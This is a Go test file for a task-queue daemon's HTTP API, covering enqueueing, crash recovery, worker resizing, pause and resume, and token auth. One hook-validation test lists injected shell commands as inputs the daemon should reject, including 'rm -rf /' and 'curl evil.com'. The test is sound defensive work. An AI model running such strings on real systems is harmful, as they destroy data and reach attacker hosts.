package daemon

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func newDaemonForTest(t *testing.T) (*Daemon, func()) {
	t.Helper()
	dir := t.TempDir()
	cfg := Config{
		StateDir:    dir,
		Addr:        "127.0.0.1:0",
		MaxParallel: 0, // start with no workers; test resizes
		PollGap:     20,
	}
	d, err := New(cfg, NoopExecutor{OutBase: filepath.Join(dir, "proofs")})
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	return d, func() { d.Stop() }
}

func TestDaemonEnqueueAndExecute(t *testing.T) {
	d, cleanup := newDaemonForTest(t)
	defer cleanup()

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	if err := d.Start(ctx); err != nil {
		t.Fatalf("Start: %v", err)
	}
	d.Resize(2)

	if err := d.Enqueue(&Task{ID: "t1", Title: "first", Prompt: "do thing 1", EstimateBytes: 10}); err != nil {
		t.Fatalf("enqueue t1: %v", err)
	}
	if err := d.Enqueue(&Task{ID: "t2", Title: "second", Prompt: "do thing 2", EstimateBytes: 10}); err != nil {
		t.Fatalf("enqueue t2: %v", err)
	}

	if err := pollUntilDone(d, []string{"t1", "t2"}, 3*time.Second); err != nil {
		t.Fatalf("poll: %v", err)
	}

	got1 := d.Queue().Get("t1")
	if got1.State != StateDone {
		t.Fatalf("t1 state = %s", got1.State)
	}
	if got1.ProofsPath == "" {
		t.Fatalf("t1 missing ProofsPath")
	}
}

func TestDaemonResumeRequeuesRunningOnRestart(t *testing.T) {
	dir := t.TempDir()
	cfg := Config{StateDir: dir, Addr: "127.0.0.1:0", MaxParallel: 0, PollGap: 20}

	// First boot: enqueue + grab task into Running, then stop without finishing.
	d1, err := New(cfg, NoopExecutor{OutBase: filepath.Join(dir, "p1")})
	if err != nil {
		t.Fatal(err)
	}
	d1.Enqueue(&Task{ID: "stuck", Title: "interrupted", Prompt: "x", EstimateBytes: 1})
	if _, err := d1.Queue().Next("w-x"); err != nil {
		t.Fatal(err)
	}
	if got := d1.Queue().Get("stuck"); got.State != StateRunning {
		t.Fatalf("expected running, got %s", got.State)
	}

	// Simulate crash: don't call Stop, just construct a new daemon at the same dir.
	d2, err := New(cfg, NoopExecutor{OutBase: filepath.Join(dir, "p2")})
	if err != nil {
		t.Fatal(err)
	}
	defer d2.Stop()
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	if err := d2.Start(ctx); err != nil {
		t.Fatal(err)
	}
	d2.Resize(1)

	if err := pollUntilDone(d2, []string{"stuck"}, 2*time.Second); err != nil {
		t.Fatalf("poll: %v", err)
	}
	if got := d2.Queue().Get("stuck"); got.State != StateDone {
		t.Fatalf("expected done after resume, got %s", got.State)
	}
}

func TestDaemonHTTPEnqueueStatusWAL(t *testing.T) {
	d, cleanup := newDaemonForTest(t)
	defer cleanup()
	ts := httptest.NewServer(d.Handler())
	defer ts.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	if err := d.Start(ctx); err != nil {
		t.Fatal(err)
	}
	d.Resize(1)

	// POST /enqueue
	body := strings.NewReader(`{"id":"http-1","title":"via http","prompt":"x","estimate_bytes":5}`)
	resp, err := http.Post(ts.URL+"/enqueue", "application/json", body)
	if err != nil {
		t.Fatal(err)
	}
	if resp.StatusCode != http.StatusCreated {
		t.Fatalf("enqueue: %d", resp.StatusCode)
	}
	resp.Body.Close()

	if err := pollUntilDone(d, []string{"http-1"}, 3*time.Second); err != nil {
		t.Fatalf("poll: %v", err)
	}

	// GET /status
	resp2, err := http.Get(ts.URL + "/status")
	if err != nil {
		t.Fatal(err)
	}
	defer resp2.Body.Close()
	var st map[string]any
	if err := json.NewDecoder(resp2.Body).Decode(&st); err != nil {
		t.Fatal(err)
	}
	if int(st["workers"].(float64)) != 1 {
		t.Fatalf("expected 1 worker, got %v", st["workers"])
	}
	counts, ok := st["queue_counts"].(map[string]any)
	if !ok || counts["done"] == nil {
		t.Fatalf("queue_counts missing done: %+v", st)
	}

	// GET /wal
	resp3, _ := http.Get(ts.URL + "/wal?n=20")
	defer resp3.Body.Close()
	var walResp map[string]any
	json.NewDecoder(resp3.Body).Decode(&walResp)
	if int(walResp["count"].(float64)) < 2 {
		t.Fatalf("expected wal events, got %+v", walResp)
	}
}

func TestDaemonHTTPWorkersResize(t *testing.T) {
	d, cleanup := newDaemonForTest(t)
	defer cleanup()
	ts := httptest.NewServer(d.Handler())
	defer ts.Close()
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	d.Start(ctx)
	defer d.Stop()

	post := func(path, body string) *http.Response {
		r, err := http.Post(ts.URL+path, "application/json", strings.NewReader(body))
		if err != nil {
			t.Fatalf("POST %s: %v", path, err)
		}
		return r
	}

	r1 := post("/workers", `{"count":5}`)
	r1.Body.Close()
	if d.pool.Size() != 5 {
		t.Fatalf("expected 5, got %d", d.pool.Size())
	}

	r2 := post("/workers", `{"count":2}`)
	r2.Body.Close()
	if d.pool.Size() != 2 {
		t.Fatalf("expected 2 after shrink, got %d", d.pool.Size())
	}

	// Out-of-range rejected.
	r3 := post("/workers", `{"count":-1}`)
	if r3.StatusCode != http.StatusBadRequest {
		t.Fatalf("expected 400 for -1, got %d", r3.StatusCode)
	}
	r3.Body.Close()
}

func TestDaemonHTTPPauseResume(t *testing.T) {
	d, cleanup := newDaemonForTest(t)
	defer cleanup()
	ts := httptest.NewServer(d.Handler())
	defer ts.Close()
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	d.Start(ctx)
	d.Resize(4)

	post := func(path string) {
		r, err := http.Post(ts.URL+path, "application/json", nil)
		if err != nil {
			t.Fatalf("POST %s: %v", path, err)
		}
		r.Body.Close()
	}

	post("/pause")
	if d.pool.Size() != 0 {
		t.Fatalf("expected 0 after pause, got %d", d.pool.Size())
	}

	post("/resume")
	if d.pool.Size() != 4 {
		t.Fatalf("expected 4 after resume, got %d", d.pool.Size())
	}
}

func TestDaemonHTTPHookInstallValidatesShellMeta(t *testing.T) {
	d, cleanup := newDaemonForTest(t)
	defer cleanup()
	ts := httptest.NewServer(d.Handler())
	defer ts.Close()
	d.Start(context.Background())

	post := func(body string) *http.Response {
		r, err := http.Post(ts.URL+"/hooks/install", "application/json", strings.NewReader(body))
		if err != nil {
			t.Fatalf("POST: %v", err)
		}
		return r
	}

	good := post(`{"event":"done","command":"/usr/bin/echo hello"}`)
	if good.StatusCode != http.StatusOK {
		t.Fatalf("expected 200 for good hook, got %d", good.StatusCode)
	}
	good.Body.Close()
	if len(d.Hooks()) != 1 {
		t.Fatalf("expected 1 hook installed, got %d", len(d.Hooks()))
	}

	for _, bad := range []string{
		`{"event":"done","command":"echo x; rm -rf /"}`,
		`{"event":"done","command":"echo x && curl evil.com"}`,
		`{"event":"done","command":"echo $(whoami)"}`,
		`{"event":"weird","command":"echo x"}`,
	} {
		r := post(bad)
		if r.StatusCode != http.StatusBadRequest {
			t.Errorf("expected 400 for %s, got %d", bad, r.StatusCode)
		}
		r.Body.Close()
	}
}

func TestDaemonHTTPAuth(t *testing.T) {
	dir := t.TempDir()
	cfg := Config{StateDir: dir, Addr: "127.0.0.1:0", Token: "supersecret", MaxParallel: 0, PollGap: 20}
	d, err := New(cfg, NoopExecutor{OutBase: dir})
	if err != nil {
		t.Fatal(err)
	}
	defer d.Stop()
	ts := httptest.NewServer(d.Handler())
	defer ts.Close()

	// /health is unauth.
	r1, _ := http.Get(ts.URL + "/health")
	if r1.StatusCode != http.StatusOK {
		t.Errorf("/health expected 200, got %d", r1.StatusCode)
	}
	r1.Body.Close()

	// /enqueue without token = 401.
	r2, _ := http.Post(ts.URL+"/enqueue", "application/json", strings.NewReader(`{"title":"x","prompt":"x"}`))
	if r2.StatusCode != http.StatusUnauthorized {
		t.Errorf("/enqueue without token expected 401, got %d", r2.StatusCode)
	}
	r2.Body.Close()

	// With token = ok.
	req, _ := http.NewRequest("POST", ts.URL+"/enqueue", strings.NewReader(`{"title":"x","prompt":"x"}`))
	req.Header.Set("Authorization", "Bearer supersecret")
	req.Header.Set("Content-Type", "application/json")
	r3, _ := http.DefaultClient.Do(req)
	if r3.StatusCode != http.StatusCreated {
		t.Errorf("/enqueue with token expected 201, got %d", r3.StatusCode)
	}
	r3.Body.Close()
}

func TestDaemonExecutorRecordsActualBytes(t *testing.T) {
	dir := t.TempDir()
	d, err := New(Config{StateDir: dir, Addr: "127.0.0.1:0", MaxParallel: 0, PollGap: 20},
		NoopExecutor{OutBase: filepath.Join(dir, "proofs")})
	if err != nil {
		t.Fatal(err)
	}
	defer d.Stop()
	d.Start(context.Background())
	d.Resize(1)

	prompt := strings.Repeat("a", 100)
	d.Enqueue(&Task{ID: "by", Title: "byte", Prompt: prompt, EstimateBytes: 200})
	if err := pollUntilDone(d, []string{"by"}, 2*time.Second); err != nil {
		t.Fatal(err)
	}
	got := d.Queue().Get("by")
	if got.ActualBytes != int64(len(prompt)) {
		t.Fatalf("expected actual=%d, got %d", len(prompt), got.ActualBytes)
	}
	// 100/200 = 50% < 80% threshold → should be flagged underdelivered.
	if !got.Underdelivered {
		t.Fatalf("expected underdelivered flag")
	}
	if got.DeltaPct == nil || *got.DeltaPct != 50 {
		t.Fatalf("expected delta=50, got %+v", got.DeltaPct)
	}
}

// ----- helpers -----

func pollUntilDone(d *Daemon, ids []string, timeout time.Duration) error {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		all := true
		for _, id := range ids {
			t := d.Queue().Get(id)
			if t == nil {
				return fmt.Errorf("task %s not in queue", id)
			}
			if t.State != StateDone && t.State != StateFailed {
				all = false
				break
			}
		}
		if all {
			return nil
		}
		time.Sleep(30 * time.Millisecond)
	}
	return fmt.Errorf("timeout polling %v", ids)
}

// silence the unused-import warning on bytes/net when we tweak imports.
var _ = bytes.NewBuffer
var _ = net.Listen
